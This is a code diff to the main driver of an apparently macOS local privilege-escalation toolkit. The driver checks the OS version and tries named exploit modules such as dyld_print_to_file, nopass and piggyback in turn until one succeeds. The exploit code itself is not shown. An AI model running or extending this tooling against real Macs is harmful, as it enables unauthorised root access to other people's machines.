@@ -11,23 +11,28 @@ ENDC = "\033[00m"
 
 
 def main():
+    """main function"""
     version = platform.mac_ver()[0]
-    for exploit in [dyld_print_to_file, libmalloc, nopass, rootpipe, applescript]:
+    for exploit in [ardagent, dyld_print_to_file, libmalloc, nopass, piggyback, phish]:
         if not exploit.vulnerable(LooseVersion(version)):
             print(YELLOWC + "Skipping %s...\n" % exploit.__name__ + ENDC)
             continue
         print(YELLOWC + "Trying %s...\n" % exploit.__name__ + ENDC)
-        result = exploit.run()
+        try:
+            result = exploit.run()
+        except KeyboardInterrupt:
+            continue
         if result:
             print(GREENC + exploit.__name__ + " was successful!" + ENDC)
             return result
         print(REDC + "Failed\n" + ENDC)
     print(REDC + "All Exploits Failed..." + ENDC)
+    return
 
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("Exitting...")
+        print("\nExitting...")
         exit(0)
